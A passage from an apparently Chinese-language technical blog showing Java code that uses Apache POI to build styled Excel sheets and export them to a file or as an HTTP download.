string">"4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v2<span class="token punctuation">.</span><span class="token function">setMay</span><span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v2<span class="token punctuation">.</span><span class="token function">setJune</span><span class="token punctuation">(</span><span class="token string">"6"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v2<span class="token punctuation">.</span><span class="token function">setJuly</span><span class="token punctuation">(</span><span class="token string">"7"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v2<span class="token punctuation">.</span><span class="token function">setAugust</span><span class="token punctuation">(</span><span class="token string">"8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v2<span class="token punctuation">.</span><span class="token function">setSeptember</span><span class="token punctuation">(</span><span class="token string">"9"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v2<span class="token punctuation">.</span><span class="token function">setOctober</span><span class="token punctuation">(</span><span class="token string">"10"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v2<span class="token punctuation">.</span><span class="token function">setNovember</span><span class="token punctuation">(</span><span class="token string">"11"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v2<span class="token punctuation">.</span><span class="token function">setDecember</span><span class="token punctuation">(</span><span class="token string">"12"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        vo<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exportExcelV2</span><span class="token punctuation">(</span>vo<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>exportExcel格式：</p><p><img src="/images/%E8%87%AA%E5%AE%9A%E4%B9%89ExcelV1.png" alt="样例1"></p><p>exportExcelV2格式：</p><p><img src="/images/%E8%87%AA%E5%AE%9A%E4%B9%89ExcelV2.png" alt="样例2"></p><h2 id="ExcelExportUtil"><a href="#ExcelExportUtil" class="headerlink" title="ExcelExportUtil"></a>ExcelExportUtil</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>admin<span class="token punctuation">.</span>config<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSONObject<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>admin<span class="token punctuation">.</span>entity<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang3<span class="token punctuation">.</span>StringUtils<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>hssf<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>hssf<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HSSFColor<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>ss<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xssf<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>ServletOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletResponse<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URLEncoder<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>text<span class="token punctuation">.</span>SimpleDateFormat<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ArrayList<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Iterator<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExcelExportUtil</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 导出Excel     *     * @param sheetName       表格 sheet 的名称     * @param headers         标题名称     * @param dataList        需要显示的数据集合     * @param exportExcelName 导出excel文件的名字     */</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">exportExcel</span><span class="token punctuation">(</span>String sheetName<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">>></span> dataList<span class="token punctuation">,</span>                            String<span class="token punctuation">[</span><span class="token punctuation">]</span> headers<span class="token punctuation">,</span> String exportExcelName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 声明一个工作薄</span>        XSSFWorkbook workbook <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 生成一个表格</span>        XSSFSheet sheet <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span>sheetName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 设置表格默认列宽度为15个字节</span>        sheet<span class="token punctuation">.</span><span class="token function">setDefaultColumnWidth</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 生成表格中非标题栏的样式</span>        XSSFCellStyle style <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 设置这些样式</span>        style<span class="token punctuation">.</span><span class="token function">setFillForegroundColor</span><span class="token punctuation">(</span>HSSFColor<span class="token punctuation">.</span>HSSFColorPredefined<span class="token punctuation">.</span>WHITE<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//背景色</span>        style<span class="token punctuation">.</span><span class="token function">setFillPattern</span><span class="token punctuation">(</span>FillPatternType<span class="token punctuation">.</span>SOLID_FOREGROUND<span class="token punctuation">)</span><span class="token punctuation">;</span>        style<span class="token punctuation">.</span><span class="token function">setBorderBottom</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span>        style<span class="token punctuation">.</span><span class="token function">setBorderLeft</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span>        style<span class="token punctuation">.</span><span class="token function">setBorderRight</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span>        style<span class="token punctuation">.</span><span class="token function">setBorderTop</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span>        style<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span>HorizontalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 生成表格中非标题栏的字体</span>        XSSFFont font <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        font<span class="token punctuation">.</span><span class="token function">setColor</span><span class="token punctuation">(</span>HSSFColor<span class="token punctuation">.</span>HSSFColorPredefined<span class="token punctuation">.</span>BLACK<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        font<span class="token punctuation">.</span><span class="token function">setFontHeightInPoints</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        font<span class="token punctuation">.</span><span class="token function">setBold</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 把字体应用到当前的样式</span>        style<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 设置表格标题栏的样式</span>        XSSFCellStyle titleStyle <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        titleStyle<span class="token punctuation">.</span><span class="token function">setFillForegroundColor</span><span class="token punctuation">(</span>HSSFColor<span class="token punctuation">.</span>HSSFColorPredefined<span class="token punctuation">.</span>BLUE_GREY<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        titleStyle<span class="token punctuation">.</span><span class="token function">setFillPattern</span><span class="token punctuation">(</span>FillPatternType<span class="token punctuation">.</span>SOLID_FOREGROUND<span class="token punctuation">)</span><span class="token punctuation">;</span>        titleStyle<span class="token punctuation">.</span><span class="token function">setBorderBottom</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span>        titleStyle<span class="token punctuation">.</span><span class="token function">setBorderLeft</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span>        titleStyle<span class="token punctuation">.</span><span class="token function">setBorderRight</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span>        titleStyle<span class="token punctuation">.</span><span class="token function">setBorderTop</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span>        titleStyle<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span>HorizontalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>        titleStyle<span class="token punctuation">.</span><span class="token function">setVerticalAlignment</span><span class="token punctuation">(</span>VerticalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 设置标题栏字体</span>        XSSFFont titleFont <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        titleFont<span class="token punctuation">.</span><span class="token function">setColor</span><span class="token punctuation">(</span>HSSFColor<span class="token punctuation">.</span>HSSFColorPredefined<span class="token punctuation">.</span>WHITE<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        titleFont<span class="token punctuation">.</span><span class="token function">setFontHeightInPoints</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        titleFont<span class="token punctuation">.</span><span class="token function">setBold</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 把字体应用到当前的样式</span>        titleStyle<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>titleFont<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 产生表格标题行</span>        XSSFRow row <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">short</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> headers<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            XSSFCell cell <span class="token operator">=</span> row<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>titleStyle<span class="token punctuation">)</span><span class="token punctuation">;</span>            XSSFRichTextString text <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XSSFRichTextString</span><span class="token punctuation">(</span>headers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 遍历集合数据，产生数据行</span>        Iterator<span class="token operator">&lt;</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">>></span> it <span class="token operator">=</span> dataList<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>it<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            index<span class="token operator">++</span><span class="token punctuation">;</span>            row <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>            Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> data <span class="token operator">=</span> it<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>String key <span class="token operator">:</span> data<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                XSSFCell cell <span class="token operator">=</span> row<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>style<span class="token punctuation">)</span><span class="token punctuation">;</span>                XSSFRichTextString text <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XSSFRichTextString</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>                i<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        OutputStream out <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            String tmpPath <span class="token operator">=</span> <span class="token string">"C:\\excel\\"</span> <span class="token operator">+</span> exportExcelName <span class="token operator">+</span> <span class="token string">".xlsx"</span><span class="token punctuation">;</span>            out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>tmpPath<span class="token punctuation">)</span><span class="token punctuation">;</span>            workbook<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>workbook <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    workbook<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>out <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 创建每个 sheet 页的数据     */</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">createSheetData</span><span class="token punctuation">(</span>HSSFWorkbook aWorkbook<span class="token punctuation">,</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> aTitles<span class="token punctuation">,</span> String aSheetName<span class="token punctuation">,</span>                                 List<span class="token operator">&lt;</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> aRowData<span class="token punctuation">)</span> <span class="token punctuation">{</span>        HSSFSheet tmpSheet <span class="token operator">=</span> aWorkbook<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span>aSheetName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 设置sheet的标题</span>        HSSFRow tmpTitileRow <span class="token operator">=</span> tmpSheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> aTitles<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            tmpTitileRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>aTitles<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 遍历填充每行的数据</span>        HSSFRow tmpRow <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">int</span> tmpRowNumber <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> rowData <span class="token operator">:</span> aRowData<span class="token punctuation">)</span> <span class="token punctuation">{</span>            tmpRow <span class="token operator">=</span> tmpSheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>tmpRowNumber<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> rowData<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                tmpRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>rowData<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            tmpRowNumber<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 设置响应头     */</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">setResponseHeader</span><span class="token punctuation">(</span>HttpServletResponse aResponse<span class="token punctuation">,</span> String aFileName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                aFileName <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>aFileName<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">UnsupportedEncodingException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            aResponse<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"application/octet-stream;charset=UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            aResponse<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Disposition"</span><span class="token punctuation">,</span> <span class="token string">"attachment;filename="</span> <span class="token operator">+</span> aFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>            aResponse<span class="token punctuation">.</span><span class="token function">addHeader</span><span class="token punctuation">(</span><span class="token string">"Pargam"</span><span class="token punctuation">,</span> <span class="token string">"no-cache"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            aResponse<span class="token punctuation">.</span><span class="token function">addHeader</span><span class="token punctuation">(</span><span class="token string">"Cache-Control"</span><span class="token punctuation">,</span> <span class="token string">"no-cache"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 通过页面导出     *     * @param aResponse     * @throws IOException     */</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">export</span><span class="token punctuation">(</span>HttpServletResponse aResponse<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        HSSFWorkbook tmpWorkbook <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String<span class="token punctuation">[</span><span class="token punctuation">]</span> tmpUserTitles <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"姓名"</span><span class="token punctuation">,</span> <span class="token string">"性别"</span><span class="token punctuation">,</span> <span class="token string">"年龄"</span><span class="token punctuation">,</span> <span class="token string">"工作"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        aResponse<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"content-type"</span><span class="token punctuation">,</span> <span class="token string">"text/xls;charset=UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        aResponse<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-disposition"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"attachment; filename=\"%s\""</span><span class="token punctuation">,</span> <span class="token string">"用户信息表_"</span> <span class="token operator">+</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".xls"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        aResponse<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Pragma"</span><span class="token punctuation">,</span> <span class="token string">"No-cache"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//设置响应头信息，告诉浏览器不要缓存此内容</span>        aResponse<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Cache-Control"</span><span class="token punctuation">,</span> <span class="token string">"no-cache"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        aResponse<span class="token punctuation">.</span><span class="token function">setDateHeader</span><span class="token punctuation">(</span><span class="token string">"Expire"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> tmpUsers <span class="token operator">=</span> <span class="token function">getUsers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">createSheetData</span><span class="token punctuation">(</span>tmpWorkbook<span class="token punctuation">,</span> tmpUserTitles<span class="token punctuation">,</span> <span class="token string">"用户信息"</span><span class="token punctuation">,</span> tmpUsers<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        setResponseHeader(aResponse, "用户信息表.xls");</span>        OutputStream tmpOutputStream <span class="token operator">=</span> aResponse<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tmpWorkbook<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>tmpOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        tmpOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tmpOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 导出，不通过页面导出     */</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">export</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        HSSFWorkbook tmpWorkbook <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String<span class="token punctuation">[</span><span class="token punctuation">]</span> tmpUserTitles <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"姓名"</span><span class="token punctuation">,</span> <span class="token string">"性别"</span><span class="token punctuation">,</span> <span class="token string">"年龄"</span><span class="token punctuation">,</span> <span class="token string">"工作"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> tmpUsers <span class="token operator">=</span> <span class="token function">getUsers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">createSheetData</span><span class="token punctuation">(</span>tmpWorkbook<span class="token punctuation">,</span> tmpUserTitles<span class="token punctuation">,</span> <span class="token string">"用户信息"</span><span class="token punctuation">,</span> tmpUsers<span class="token punctuation">)</span><span class="token punctuation">;</span>        String<span class="token punctuation">[</span><span class="token punctuation">]</span> tmpAddressTitles <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"城市"</span><span class="token punctuation">,</span> <span class="token 